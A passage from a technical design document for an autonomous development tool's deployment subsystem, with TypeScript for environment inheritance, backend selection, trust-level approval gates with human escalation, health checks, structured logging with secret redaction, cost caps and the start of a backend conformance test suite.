  timeout_seconds: 1200 # 20 minutes max
  artifact_retention_days: 30
  cache_enabled: true
  max_artifact_size_mb: 1024

# Cost governance integration
cost:
  daily_cap_usd: 200
  monthly_cap_usd: 2000
  escalation_threshold_usd: 100 # Escalate deploys over $100

# Rollback configuration
rollback:
  retention_hours: 24
  auto_rollback_on_health_failure: true
  health_check_retries: 3
  health_check_interval_seconds: 30
  manual_rollback_confirmation_required: true

# Observability settings
observability:
  log_level: "info" # "debug", "info", "warn", "error"
  structured_logging: true
  metrics_enabled: true
  deployment_notifications: true
```

### 9.2 Environment Inheritance Resolution

```typescript
interface EnvironmentResolver {
  resolveEnvironment(envName: string, config: DeploymentConfig): ResolvedEnvironment;
}

class EnvironmentResolverImpl implements EnvironmentResolver {
  resolveEnvironment(envName: string, config: DeploymentConfig): ResolvedEnvironment {
    const envConfig = config.environments[envName];
    if (!envConfig) {
      throw new Error(`Environment '${envName}' not found in deployment configuration`);
    }

    // Build inheritance chain
    const inheritanceChain = this.buildInheritanceChain(envName, config.environments);
    
    // Resolve configuration by merging inheritance chain
    const resolved = this.mergeConfigurations(inheritanceChain, config.environments);
    
    // Apply global defaults
    const finalConfig = this.applyGlobalDefaults(resolved, config);
    
    return {
      name: envName,
      config: finalConfig,
      backendType: finalConfig.backend,
      approvalRequired: this.determineApprovalRequired(envName, finalConfig, config),
      trustLevel: finalConfig.trust_level_override
    };
  }

  private buildInheritanceChain(envName: string, environments: Record<string, any>): string[] {
    const chain: string[] = [];
    let current = envName;
    const visited = new Set<string>();

    while (current) {
      if (visited.has(current)) {
        throw new Error(`Circular inheritance detected: ${Array.from(visited).join(' -> ')} -> ${current}`);
      }
      
      visited.add(current);
      chain.push(current);
      
      const envConfig = environments[current];
      current = envConfig?.inherits;
    }

    return chain.reverse(); // Base environment first
  }

  private mergeConfigurations(chain: string[], environments: Record<string, any>): any {
    let merged = {};
    
    for (const envName of chain) {
      const envConfig = { ...environments[envName] };
      delete envConfig.inherits; // Don't merge the inheritance directive
      
      merged = this.deepMerge(merged, envConfig);
    }
    
    return merged;
  }

  private deepMerge(target: any, source: any): any {
    if (source === null || source === undefined) return target;
    if (typeof source !== 'object') return source;
    
    const result = { ...target };
    
    for (const key in source) {
      if (source.hasOwnProperty(key)) {
        if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
          result[key] = this.deepMerge(result[key] || {}, source[key]);
        } else {
          result[key] = source[key];
        }
      }
    }
    
    return result;
  }
}
```

## 10. Backend Selection Algorithm

```typescript
interface BackendSelector {
  selectBackend(
    requestId: string,
    targetEnvironment: string,
    repositoryPath: string
  ): Promise<DeploymentBackend>;
}

class BackendSelectorImpl implements BackendSelector {
  constructor(
    private configLoader: DeploymentConfigLoader,
    private environmentResolver: EnvironmentResolver,
    private backendRegistry: BackendRegistry,
    private projectDetector: ProjectDetectionService
  ) {}

  async selectBackend(
    requestId: string,
    targetEnvironment: string,
    repositoryPath: string
  ): Promise<DeploymentBackend> {
    try {
      // Load deployment configuration
      const deployConfig = await this.configLoader.loadDeploymentConfig(repositoryPath);
      
      // Resolve environment with inheritance
      const resolvedEnv = this.environmentResolver.resolveEnvironment(targetEnvironment, deployConfig);
      
      // Get backend from registry
      const backend = this.backendRegistry.getBackend(resolvedEnv.backendType);
      
      if (!backend) {
        throw new Error(`Backend '${resolvedEnv.backendType}' not found. Available backends: ${this.backendRegistry.listBackends().join(', ')}`);
      }
      
      // Validate backend supports detected project type
      const detection = this.projectDetector.detect(repositoryPath);
      if (backend.capabilities.supportedProjectTypes.length > 0 && 
          !backend.capabilities.supportedProjectTypes.includes(detection.language) &&
          !backend.capabilities.supportedProjectTypes.includes('any')) {
        throw new Error(`Backend '${resolvedEnv.backendType}' does not support project type '${detection.language}'. Supported types: ${backend.capabilities.supportedProjectTypes.join(', ')}`);
      }
      
      // Validate backend configuration
      if (backend.validateConfig) {
        const validationResult = await backend.validateConfig(resolvedEnv.config);
        if (!validationResult.valid) {
          throw new Error(`Backend configuration validation failed: ${validationResult.errors.join(', ')}`);
        }
      }
      
      return backend;
      
    } catch (error) {
      // Fallback to local backend for backward compatibility
      if (error.message.includes('deployment configuration not found') || 
          error.message.includes('Environment') && error.message.includes('not found')) {
        
        console.warn(`Deployment configuration issue: ${error.message}. Falling back to 'local' backend.`);
        return this.backendRegistry.getBackend('local');
      }
      
      throw error;
    }
  }
}

interface BackendRegistry {
  registerBackend(backend: DeploymentBackend): void;
  getBackend(name: string): DeploymentBackend | null;
  listBackends(): string[];
}

class BackendRegistryImpl implements BackendRegistry {
  private backends = new Map<string, DeploymentBackend>();

  constructor() {
    // Register bundled backends
    this.registerBackend(new LocalBackend());
    this.registerBackend(new StaticBackend());
    this.registerBackend(new DockerLocalBackend());
    this.registerBackend(new GitHubPagesBackend());
  }

  registerBackend(backend: DeploymentBackend): void {
    if (this.backends.has(backend.name)) {
      throw new Error(`Backend '${backend.name}' is already registered`);
    }
    
    // Validate backend implements required interface
    this.validateBackendInterface(backend);
    
    this.backends.set(backend.name, backend);
  }

  getBackend(name: string): DeploymentBackend | null {
    return this.backends.get(name) || null;
  }

  listBackends(): string[] {
    return Array.from(this.backends.keys()).sort();
  }

  private validateBackendInterface(backend: DeploymentBackend): void {
    const requiredMethods = ['build', 'deploy', 'healthCheck', 'rollback'];
    
    for (const method of requiredMethods) {
      if (typeof (backend as any)[method] !== 'function') {
        throw new Error(`Backend '${backend.name}' missing required method: ${method}`);
      }
    }
    
    if (!backend.name || typeof backend.name !== 'string') {
      throw new Error('Backend must have a string name property');
    }
    
    if (!backend.capabilities || typeof backend.capabilities !== 'object') {
      throw new Error('Backend must have a capabilities property');
    }
  }
}
```

## 11. Trust Integration

### 11.1 Environment Trust Matrix

Integration with PRD-007's trust framework provides graduated deployment autonomy:

| Environment | L0 (Full Oversight) | L1 (Guided) | L2 (PRD-Only) | L3 (Autonomous) |
|-------------|---------------------|-------------|---------------|-----------------|
| **dev**     | Approval Required   | Approval Required | Auto Deploy | Auto Deploy |
| **staging** | Approval Required   | Approval Required | Approval Required | Auto Deploy |
| **prod**    | Approval Required   | Approval Required | Approval Required | Configurable* |

*Production deployments support `approval_required: true` in environment config to force approval regardless of trust level.

### 11.2 Trust Gate Implementation

```typescript
interface DeploymentTrustGate {
  evaluateDeploymentApproval(
    requestId: string,
    environment: string,
    backend: string,
    estimatedCost: number,
    currentTrustLevel: number
  ): Promise<TrustGateResult>;
}

interface TrustGateResult {
  approved: boolean;
  requiresEscalation: boolean;
  escalationType?: 'cost' | 'trust' | 'environment' | 'manual_override';
  message: string;
  escalationPayload?: EscalationPayload;
}

class DeploymentTrustGateImpl implements DeploymentTrustGate {
  constructor(
    private trustLevelManager: TrustLevelManager,
    private escalationService: EscalationService,
    private costTracker: CostTracker
  ) {}

  async evaluateDeploymentApproval(
    requestId: string,
    environment: string,
    backend: string,
    estimatedCost: number,
    currentTrustLevel: number
  ): Promise<TrustGateResult> {
    
    // Load environment configuration
    const envConfig = await this.loadEnvironmentConfig(requestId, environment);
    
    // Check manual override first
    if (envConfig.approval_required === true) {
      return {
        approved: false,
        requiresEscalation: true,
        escalationType: 'manual_override',
        message: `Environment '${environment}' requires manual approval regardless of trust level`,
        escalationPayload: this.createApprovalEscalation(requestId, environment, backend, estimatedCost, 'manual_override')
      };
    }
    
    // Check cost cap escalation
    const costCap = envConfig.cost_cap_usd || 1000;
    if (estimatedCost > costCap) {
      return {
        approved: false,
        requiresEscalation: true,
        escalationType: 'cost',
        message: `Estimated cost $${estimatedCost} exceeds environment cap $${costCap}`,
        escalationPayload: this.createApprovalEscalation(requestId, environment, backend, estimatedCost, 'cost_cap')
      };
    }
    
    // Check global cost escalation threshold
    const escalationThreshold = await this.getGlobalCostEscalationThreshold();
    if (estimatedCost > escalationThreshold) {
      return {
        approved: false,
        requiresEscalation: true,
        escalationType: 'cost',
        message: `Estimated cost $${estimatedCost} exceeds escalation threshold $${escalationThreshold}`,
        escalationPayload: this.createApprovalEscalation(requestId, environment, backend, estimatedCost, 'cost_threshold')
      };
    }
    
    // Apply trust level matrix
    const trustOverride = envConfig.trust_level_override;
    const effectiveTrustLevel = trustOverride !== null ? trustOverride : currentTrustLevel;
    
    const autoDeployAllowed = this.checkTrustMatrix(environment, effectiveTrustLevel);
    
    if (!autoDeployAllowed) {
      return {
        approved: false,
        requiresEscalation: true,
        escalationType: 'trust',
        message: `Trust level L${effectiveTrustLevel} requires approval for '${environment}' environment`,
        escalationPayload: this.createApprovalEscalation(requestId, environment, backend, estimatedCost, 'trust_level')
      };
    }
    
    return {
      approved: true,
      requiresEscalation: false,
      message: `Auto-deploy approved: L${effectiveTrustLevel} to '${environment}' environment`
    };
  }

  private checkTrustMatrix(environment: string, trustLevel: number): boolean {
    // Implement trust matrix from section 11.1
    switch (environment) {
      case 'dev':
        return trustLevel >= 2; // L2+ can auto-deploy to dev
      case 'staging':
        return trustLevel >= 3; // L3 can auto-deploy to staging
      case 'prod':
        return false; // Production handled by manual override check
      default:
        return trustLevel >= 2; // Unknown environments default to L2+ requirement
    }
  }

  private createApprovalEscalation(
    requestId: string,
    environment: string,
    backend: string,
    estimatedCost: number,
    reason: string
  ): EscalationPayload {
    return {
      type: 'deployment_approval',
      urgency: estimatedCost > 100 ? 'soon' : 'informational',
      requestId,
      summary: `Deployment to '${environment}' environment requires approval`,
      what_was_attempted: [
        `Automatic deployment evaluation for request ${requestId}`,
        `Target: ${environment} environment using ${backend} backend`,
        `Estimated cost: $${estimatedCost}`
      ],
      failure_reason: `Approval required due to: ${reason}`,
      options: [
        {
          id: 'approve',
          label: 'Approve deployment',
          risk: estimatedCost > 100 ? 'medium' : 'low',
          description: `Proceed with deployment to ${environment} environment`
        },
        {
          id: 'modify',
          label: 'Request changes',
          risk: 'none',
          description: 'Request modifications to deployment configuration'
        },
        {
          id: 'cancel',
          label: 'Cancel deployment',
          risk: 'none',
          description: 'Cancel this deployment request'
        }
      ],
      recommendation: {
        option_id: 'approve',
        rationale: estimatedCost < 50 ? 'Low cost and standard environment' : 'Review cost and configuration before approving'
      },
      artifacts: [
        {
          type: 'deployment_plan',
          label: `${environment} deployment plan`,
          data: {
            environment,
            backend,
            estimatedCost,
            reason
          }
        }
      ]
    };
  }
}
```

## 12. Health Check & Monitor

### 12.1 Health Check Interface Contracts

Health checks must be idempotent read-only operations that can safely be called multiple times:

```typescript
interface HealthCheckStrategy {
  /** Strategy identifier for logging and configuration */
  readonly type: string;
  
  /** Execute health check against deployed service */
  check(deployment: DeploymentRecord, config: HealthCheckConfig): Promise<HealthStatus>;
  
  /** Validate health check configuration */
  validateConfig?(config: HealthCheckConfig): ValidationResult;
}

interface HealthCheckConfig {
  /** Check type configuration */
  type: 'http' | 'tcp' | 'container' | 'custom';
  
  /** Endpoint or target for check */
  endpoint?: string;
  
  /** Timeout for check operation */
  timeout_seconds: number;
  
  /** Number of retry attempts */
  retries: number;
  
  /** Interval between retries */
  retry_interval_seconds: number;
  
  /** Expected response codes for HTTP checks */
  expected_status_codes?: number[];
  
  /** Custom health check command */
  custom_command?: string[];
  
  /** Environment variables for custom commands */
  environment?: Record<string, string>;
}

class HTTPHealthCheckStrategy implements HealthCheckStrategy {
  readonly type = 'http';

  async check(deployment: DeploymentRecord, config: HealthCheckConfig): Promise<HealthStatus> {
    const url = this.buildHealthCheckUrl(deployment, config);
    const startTime = Date.now();
    
    const expectedCodes = config.expected_status_codes || [200, 201, 204];
    
    try {
      const response = await fetch(url, {
        method: 'GET',
        timeout: config.timeout_seconds * 1000,
        headers: {
          'User-Agent': 'autonomous-dev-health-check/1.0'
        }
      });
      
      const responseTime = Date.now() - startTime;
      const healthy = expectedCodes.includes(response.status);
      
      let details = `HTTP ${response.status}`;
      if (!healthy) {
        details += ` (expected ${expectedCodes.join(', ')})`;
      }
      
      return {
        healthy,
        checkType: 'http',
        responseTimeMs: responseTime,
        endpoint: url,
        details,
        timestamp: new Date().toISOString()
      };
      
    } catch (error) {
      const responseTime = Date.now() - startTime;
      
      return {
        healthy: false,
        checkType: 'http',
        responseTimeMs: responseTime,
        endpoint: url,
        details: `Health check failed: ${error.message}`,
        timestamp: new Date().toISOString()
      };
    }
  }

  private buildHealthCheckUrl(deployment: DeploymentRecord, config: HealthCheckConfig): string {
    const baseUrl = deployment.deployedEndpoint;
    if (!baseUrl) {
      throw new Error('Deployment has no endpoint for HTTP health check');
    }
    
    const endpoint = config.endpoint || '/health';
    return `${baseUrl.replace(/\/$/, '')}${endpoint}`;
  }
}

class ContainerHealthCheckStrategy implements HealthCheckStrategy {
  readonly type = 'container';

  async check(deployment: DeploymentRecord, config: HealthCheckConfig): Promise<HealthStatus> {
    const containerId = deployment.rollbackData?.containerId;
    if (!containerId) {
      return {
        healthy: false,
        checkType: 'container',
        details: 'No container ID found in deployment record',
        timestamp: new Date().toISOString()
      };
    }

    try {
      const inspectResult = await this.execWithTimeout('docker', [
        'inspect',
        '--format', '{{.State.Status}}:{{.State.Health.Status}}:{{.State.ExitCode}}',
        containerId
      ], { timeoutMs: config.timeout_seconds * 1000 });

      if (inspectResult.exitCode !== 0) {
        return {
          healthy: false,
          checkType: 'container',
          details: `Container inspection failed: ${inspectResult.stderr}`,
          timestamp: new Date().toISOString()
        };
      }

      const [status, healthStatus, exitCode] = inspectResult.stdout.trim().split(':');
      
      const healthy = status === 'running' && 
                     (healthStatus === 'healthy' || healthStatus === '<no value>') &&
                     exitCode === '0';
      
      let details = `Container ${status}`;
      if (healthStatus && healthStatus !== '<no value>') {
        details += `, health: ${healthStatus}`;
      }
      if (exitCode !== '0') {
        details += `, exit code: ${exitCode}`;
      }

      return {
        healthy,
        checkType: 'container',
        details,
        timestamp: new Date().toISOString()
      };

    } catch (error) {
      return {
        healthy: false,
        checkType: 'container',
        details: `Container health check error: ${error.message}`,
        timestamp: new Date().toISOString()
      };
    }
  }
}
```

### 12.2 Health Check Orchestration

```typescript
class HealthCheckOrchestrator {
  constructor(
    private strategies: Map<string, HealthCheckStrategy>
  ) {}

  async executeHealthCheck(
    deployment: DeploymentRecord,
    config: HealthCheckConfig
  ): Promise<HealthStatus> {
    
    const strategy = this.strategies.get(config.type);
    if (!strategy) {
      throw new Error(`Health check strategy '${config.type}' not found`);
    }

    // Validate configuration
    if (strategy.validateConfig) {
      const validation = strategy.validateConfig(config);
      if (!validation.valid) {
        throw new Error(`Health check configuration invalid: ${validation.errors.join(', ')}`);
      }
    }

    let lastError: Error | null = null;
    
    // Retry loop
    for (let attempt = 1; attempt <= config.retries + 1; attempt++) {
      try {
        const result = await strategy.check(deployment, config);
        
        // Log health check result
        this.logHealthCheckResult(deployment, attempt, result);
        
        if (result.healthy || attempt === config.retries + 1) {
          return result;
        }
        
        // Wait before retry (except on last attempt)
        if (attempt <= config.retries) {
          await this.sleep(config.retry_interval_seconds * 1000);
        }
        
      } catch (error) {
        lastError = error;
        
        if (attempt === config.retries + 1) {
          // Final attempt failed
          return {
            healthy: false,
            checkType: config.type,
            details: `All ${config.retries + 1} attempts failed. Last error: ${error.message}`,
            timestamp: new Date().toISOString()
          };
        }
        
        // Wait before retry
        await this.sleep(config.retry_interval_seconds * 1000);
      }
    }
    
    // Should not reach here, but handle gracefully
    throw lastError || new Error('Health check failed for unknown reason');
  }

  private logHealthCheckResult(deployment: DeploymentRecord, attempt: number, result: HealthStatus): void {
    const logEntry = {
      timestamp: new Date().toISOString(),
      deploymentId: deployment.deploymentId,
      attempt,
      healthy: result.healthy,
      checkType: result.checkType,
      responseTimeMs: result.responseTimeMs,
      details: result.details
    };
    
    // Write to deployment-specific health log
    const logPath = path.join(
      deployment.repositoryPath || '.',
      '.autonomous-dev/deploys',
      deployment.deploymentId,
      'health.log'
    );
    
    fs.appendFileSync(logPath, JSON.stringify(logEntry) + '\n');
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}
```

## 13. Observability

### 13.1 Per-Deploy Log Directory Structure

Each deployment creates a dedicated log directory for comprehensive observability:

```
<repo>/.autonomous-dev/deploys/<deployment-id>/
├── deployment.json          # Signed deployment record
├── build.log               # Build phase: stdout, stderr, timing
├── deploy.log              # Deploy phase: commands executed, results
├── health.log              # Health check attempts and results  
├── rollback.log            # Rollback operations (if applicable)
├── cost.log                # Cost tracking and billing events
├── metadata.json           # Deployment metadata summary
├── artifacts/              # Build artifacts and checksums
│   ├── checksums.txt
│   └── metadata.json
└── monitoring/             # Continuous monitoring data
    ├── logs.txt           # Application logs stream
    └── metrics.json       # Performance metrics snapshots
```

### 13.2 Structured Logging Implementation

```typescript
interface DeploymentLogger {
  logBuildStart(context: BuildContext): void;
  logBuildComplete(artifact: BuildArtifact): void;
  logBuildFailed(error: Error): void;
  logDeployStart(artifact: BuildArtifact, env: TargetEnvironment): void;
  logDeployComplete(record: DeploymentRecord): void;
  logDeployFailed(error: Error): void;
  logHealthCheck(attempt: number, result: HealthStatus): void;
  logRollbackStart(record: DeploymentRecord, reason: string): void;
  logRollbackComplete(result: RollbackResult): void;
  logCostEvent(event: CostEvent): void;
}

class DeploymentLoggerImpl implements DeploymentLogger {
  constructor(
    private deploymentId: string,
    private logDirectory: string
  ) {
    // Ensure log directory exists
    fs.mkdirSync(this.logDirectory, { recursive: true });
  }

  logBuildStart(context: BuildContext): void {
    const event = {
      timestamp: new Date().toISOString(),
      phase: 'build',
      event: 'start',
      requestId: context.requestId,
      repositoryPath: context.repositoryPath,
      targetEnvironment: context.targetEnvironment.name,
      backend: context.targetEnvironment.backendType,
      gitCommitSha: context.gitCommitSha,
      detectedLanguage: context.detectedLanguage,
      detectedFramework: context.detectedFramework
    };

    this.writeLog('build.log', event);
    this.writeDaemonLog(event);
  }

  logBuildComplete(artifact: BuildArtifact): void {
    const event = {
      timestamp: new Date().toISOString(),
      phase: 'build',
      event: 'complete',
      artifactId: artifact.artifactId,
      contentHash: artifact.contentHash,
      buildDurationMs: artifact.buildDurationMs,
      artifactSizeBytes: artifact.artifactSizeBytes,
      cached: artifact.metadata?.cached || false
    };

    this.writeLog('build.log', event);
    this.writeDaemonLog(event);
    
    // Write artifact metadata
    this.writeArtifactMetadata(artifact);
  }

  logDeployStart(artifact: BuildArtifact, env: TargetEnvironment): void {
    const event = {
      timestamp: new Date().toISOString(),
      phase: 'deploy',
      event: 'start',
      artifactId: artifact.artifactId,
      environment: env.name,
      backend: env.backendType,
      configuration: this.sanitizeConfiguration(env.config)
    };

    this.writeLog('deploy.log', event);
    this.writeDaemonLog(event);
  }

  logDeployComplete(record: DeploymentRecord): void {
    const event = {
      timestamp: new Date().toISOString(),
      phase: 'deploy',
      event: 'complete',
      deploymentId: record.deploymentId,
      deployedEndpoint: record.deployedEndpoint,
      status: record.status,
      cost: record.cost
    };

    this.writeLog('deploy.log', event);
    this.writeDaemonLog(event);
  }

  logHealthCheck(attempt: number, result: HealthStatus): void {
    const event = {
      timestamp: new Date().toISOString(),
      phase: 'health',
      event: 'check',
      attempt,
      healthy: result.healthy,
      checkType: result.checkType,
      responseTimeMs: result.responseTimeMs,
      endpoint: result.endpoint,
      details: result.details,
      degradedReasons: result.degradedReasons
    };

    this.writeLog('health.log', event);
    this.writeDaemonLog(event);
  }

  private writeLog(filename: string, event: any): void {
    const logPath = path.join(this.logDirectory, filename);
    const logLine = JSON.stringify(event) + '\n';
    
    try {
      fs.appendFileSync(logPath, logLine);
    } catch (error) {
      console.error(`Failed to write to deployment log ${logPath}:`, error);
    }
  }

  private writeDaemonLog(event: any): void {
    // Also write to main daemon log for centralized viewing
    const daemonLogEvent = {
      ...event,
      deploymentId: this.deploymentId,
      component: 'deployment'
    };
    
    // Delegate to main daemon logger
    DaemonLogger.log(daemonLogEvent);
  }

  private writeArtifactMetadata(artifact: BuildArtifact): void {
    const artifactsDir = path.join(this.logDirectory, 'artifacts');
    fs.mkdirSync(artifactsDir, { recursive: true });
    
    // Write artifact metadata
    const metadataPath = path.join(artifactsDir, 'metadata.json');
    fs.writeFileSync(metadataPath, JSON.stringify(artifact, null, 2));
    
    // Write checksums for integrity verification
    const checksumsPath = path.join(artifactsDir, 'checksums.txt');
    const checksumLine = `${artifact.contentHash}  ${artifact.artifactId}\n`;
    fs.appendFileSync(checksumsPath, checksumLine);
  }

  private sanitizeConfiguration(config: any): any {
    // Remove sensitive configuration values from logs
    const sanitized = JSON.parse(JSON.stringify(config));
    
    const sensitiveKeys = ['password', 'token', 'key', 'secret', 'credential'];
    
    function sanitizeRecursive(obj: any): void {
      for (const key in obj) {
        if (typeof obj[key] === 'object' && obj[key] !== null) {
          sanitizeRecursive(obj[key]);
        } else if (typeof obj[key] === 'string' && 
                   sensitiveKeys.some(sensitive => key.toLowerCase().includes(sensitive))) {
          obj[key] = '[REDACTED]';
        }
      }
    }
    
    sanitizeRecursive(sanitized);
    return sanitized;
  }
}
```

### 13.3 Daemon Log Integration

Deployment events integrate with the main daemon log (TDD-001) for centralized monitoring:

```typescript
interface DaemonLogIntegration {
  emitDeploymentEvent(event: DeploymentEvent): void;
}

interface DeploymentEvent {
  timestamp: string;
  deploymentId: string;
  requestId: string;
  phase: 'build' | 'deploy' | 'health' | 'rollback' | 'monitor';
  event: 'start' | 'complete' | 'failed' | 'progress';
  backend: string;
  environment: string;
  data: Record<string, any>;
}

class DaemonLogIntegrationImpl implements DaemonLogIntegration {
  emitDeploymentEvent(event: DeploymentEvent): void {
    const logEntry = {
      level: 'info',
      timestamp: event.timestamp,
      component: 'deployment',
      deploymentId: event.deploymentId,
      requestId: event.requestId,
      message: `${event.phase}:${event.event}`,
      data: {
        backend: event.backend,
        environment: event.environment,
        ...event.data
      }
    };
    
    // Write to daemon log using structured format
    DaemonLogger.writeStructured(logEntry);
    
    // Emit event for real-time monitoring
    EventEmitter.emit('deployment:event', event);
  }
}
```

## 14. Cost Cap Enforcement

### 14.1 Cost Tracking Integration

Cost cap enforcement integrates with PRD-001's cost governance framework:

```typescript
interface DeploymentCostTracker {
  estimateDeploymentCost(
    backend: string,
    context: BuildContext,
    environment: TargetEnvironment
  ): Promise<CostEstimate>;
  
  recordActualCost(
    deploymentId: string,
    actualCost: number,
    currency: string
  ): Promise<void>;
  
  checkCostLimits(
    requestId: string,
    environment: string,
    estimatedCost: number
  ): Promise<CostLimitResult>;
}

interface CostEstimate {
  buildCostUsd: number;
  deployCostUsd: number;
  runtimeCostUsdPerHour: number;
  projectedMonthlyCostUsd: number;
  breakdown: CostBreakdown;
  confidence: 'low' | 'medium' | 'high';
}

interface CostBreakdown {
  compute: number;
  storage: number;
  network: number;
  services: number;
  other: number;
}

interface CostLimitResult {
  withinLimits: boolean;
  violations: CostViolation[];
  recommendedAction: 'proceed' | 'escalate' | 'block';
  dailyUsageUsd: number;
  monthlyUsageUsd: number;
  dailyLimitUsd: number;
  monthlyLimitUsd: number;
}

interface CostViolation {
  type: 'environment_cap' | 'daily_limit' | 'monthly_limit' | 'escalation_threshold';
  limitUsd: number;
  actualUsd: number;
  severity: 'warning' | 'error';
  message: string;
}

class DeploymentCostTrackerImpl implements DeploymentCostTracker {
  constructor(
    private globalCostLedger: GlobalCostLedger,
    private costEstimators: Map<string, BackendCostEstimator>
  ) {}

  async estimateDeploymentCost(
    backend: string,
    context: BuildContext,
    environment: TargetEnvironment
  ): Promise<CostEstimate> {
    
    const estimator = this.costEstimators.get(backend);
    if (!estimator) {
      // Default estimate for unknown backends
      return {
        buildCostUsd: 0,
        deployCostUsd: 0,
        runtimeCostUsdPerHour: 0,
        projectedMonthlyCostUsd: 0,
        breakdown: { compute: 0, storage: 0, network: 0, services: 0, other: 0 },
        confidence: 'low'
      };
    }

    return await estimator.estimate(context, environment);
  }

  async checkCostLimits(
    requestId: string,
    environment: string,
    estimatedCost: number
  ): Promise<CostLimitResult> {
    
    // Get current usage from global ledger
    const currentUsage = await this.globalCostLedger.getCurrentUsage();
    
    // Load limits from configuration
    const limits = await this.loadCostLimits();
    const envConfig = await this.loadEnvironmentConfig(environment);
    
    const violations: CostViolation[] = [];
    
    // Check environment-specific cap
    if (envConfig.cost_cap_usd && estimatedCost > envConfig.cost_cap_usd) {
      violations.push({
        type: 'environment_cap',
        limitUsd: envConfig.cost_cap_usd,
        actualUsd: estimatedCost,
        severity: 'error',
        message: `Deployment cost $${estimatedCost} exceeds ${environment} environment cap $${envConfig.cost_cap_usd}`
      });
    }
    
    // Check daily limit
    const projectedDailyUsage = currentUsage.dailyUsageUsd + estimatedCost;
    if (projectedDailyUsage > limits.daily_cap_usd) {
      violations.push({
        type: 'daily_limit',
        limitUsd: limits.daily_cap_usd,
        actualUsd: projectedDailyUsage,
        severity: 'error',
        message: `Projected daily usage $${projectedDailyUsage} exceeds daily limit $${limits.daily_cap_usd}`
      });
    }
    
    // Check monthly limit
    const projectedMonthlyUsage = currentUsage.monthlyUsageUsd + estimatedCost;
    if (projectedMonthlyUsage > limits.monthly_cap_usd) {
      violations.push({
        type: 'monthly_limit',
        limitUsd: limits.monthly_cap_usd,
        actualUsd: projectedMonthlyUsage,
        severity: 'error',
        message: `Projected monthly usage $${projectedMonthlyUsage} exceeds monthly limit $${limits.monthly_cap_usd}`
      });
    }
    
    // Check escalation threshold
    if (estimatedCost > limits.escalation_threshold_usd) {
      violations.push({
        type: 'escalation_threshold',
        limitUsd: limits.escalation_threshold_usd,
        actualUsd: estimatedCost,
        severity: 'warning',
        message: `Deployment cost $${estimatedCost} exceeds escalation threshold $${limits.escalation_threshold_usd}`
      });
    }
    
    // Determine recommended action
    let recommendedAction: 'proceed' | 'escalate' | 'block' = 'proceed';
    
    if (violations.some(v => v.severity === 'error')) {
      recommendedAction = 'block';
    } else if (violations.some(v => v.severity === 'warning')) {
      recommendedAction = 'escalate';
    }
    
    return {
      withinLimits: violations.length === 0,
      violations,
      recommendedAction,
      dailyUsageUsd: currentUsage.dailyUsageUsd,
      monthlyUsageUsd: currentUsage.monthlyUsageUsd,
      dailyLimitUsd: limits.daily_cap_usd,
      monthlyLimitUsd: limits.monthly_cap_usd
    };
  }
}
```

### 14.2 Backend-Specific Cost Estimation

Each backend implements cost estimation based on its resource model:

```typescript
interface BackendCostEstimator {
  estimate(context: BuildContext, environment: TargetEnvironment): Promise<CostEstimate>;
}

class DockerLocalCostEstimator implements BackendCostEstimator {
  async estimate(context: BuildContext, environment: TargetEnvironment): Promise<CostEstimate> {
    // Docker local is free - only local resource consumption
    return {
      buildCostUsd: 0,
      deployCostUsd: 0,
      runtimeCostUsdPerHour: 0,
      projectedMonthlyCostUsd: 0,
      breakdown: { compute: 0, storage: 0, network: 0, services: 0, other: 0 },
      confidence: 'high'
    };
  }
}

class StaticBackendCostEstimator implements BackendCostEstimator {
  async estimate(context: BuildContext, environment: TargetEnvironment): Promise<CostEstimate> {
    // Static deployment might have minimal server costs
    const config = environment.config.settings.static;
    
    // Estimate based on data transfer if server costs configured
    const estimatedTransferCost = this.estimateTransferCost(context);
    
    return {
      buildCostUsd: 0.01, // Minimal build cost for static generation
      deployCostUsd: estimatedTransferCost,
      runtimeCostUsdPerHour: 0, // No ongoing runtime cost
      projectedMonthlyCostUsd: estimatedTransferCost,
      breakdown: { 
        compute: 0.01, 
        storage: 0, 
        network: estimatedTransferCost, 
        services: 0, 
        other: 0 
      },
      confidence: 'medium'
    };
  }

  private estimateTransferCost(context: BuildContext): number {
    // Estimate data transfer cost based on repository size
    const estimatedSizeKB = 1000; // Default estimate
    const transferCostPerKB = 0.00001; // $0.01 per MB
    return estimatedSizeKB * transferCostPerKB;
  }
}
```

## 15. Test Strategy

### 15.1 Backend Conformance Test Suite

Every backend implementation must pass a comprehensive test suite ensuring safety and reliability:

```typescript
describe('Backend Conformance Tests', () => {
  let backend: DeploymentBackend;
  let testContext: BuildContext;
  let testEnvironment: TargetEnvironment;

  beforeEach(() => {
    backend = createBackendUnderTest();
    testContext = createTestBuildContext();
    testEnvironment = createTestEnvironment();
  });

  describe('Interface Compliance', () => {
    it('implements required methods with correct signatures', () => {
      expect(typeof backend.build).toBe('function');
      expect(typeof backend.deploy).toBe('function');
      expect(typeof backend.healthCheck).toBe('function');
      expect(typeof backend.rollback).toBe('function');
      expect(backend.build.length).toBe(1); // Single BuildContext parameter
      expect(backend.deploy.length).toBe(2); // BuildArtifact + TargetEnvironment
    });

    it('has valid backend metadata', () => {
      expect(backend.name).toBeTruthy();
      expect(typeof backend.name).toBe('string');
      expect(backend.capabilities).toBeDefined();
      expect(['free', 'pay-per-build', 'pay-per-runtime', 'custom']).toContain(backend.costModel);
    });

    it('declares realistic capability flags', () => {
      expect(typeof backend.capabilities.supportsRollback).toBe('boolean');
      expect(typeof backend.capabilities.supportsMonitoring).toBe('boolean');
      expect(Array.isArray(backend.capabilities.supportedProjectTypes)).toBe(true);
      expect(typeof backend.capabilities.estimatedLatency.buildSeconds).toBe('number');
    });
  });

  describe('Build Phase', () => {
    it('produces valid BuildArtifact with required fields', async () => {
      const artifact = await backend.build(testContext);
      
      expect(artifact.artifactId).toBeTruthy();
      expect(artifact.contentHash).toBeTruthy();
      expect(artifact.createdAt).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/); // ISO 8601
      expect(typeof artifact.buildDurationMs).toBe('number');
      expect(artifact.buildDurationMs).toBeGreaterThanOrEqual(0);
      expect(typeof artifact.artifactSizeBytes).toBe('number');
      expect(artifact.artifactPath).toBeTruthy();
    });

    it('is idempotent - same context produces same artifact', async () => {
      const artifact1 = await backend.build(testContext);
      const artifact2 = await backend.build(testContext);
      
      expect(artifact1.artifactId).toBe(artifact2.artifactId);
      expect(artifact1.contentHash).toBe(artifact2.contentHash);
    });

    it('handles invalid build context gracefully', async () => {
      const invalidContext = {
        ...testContext,
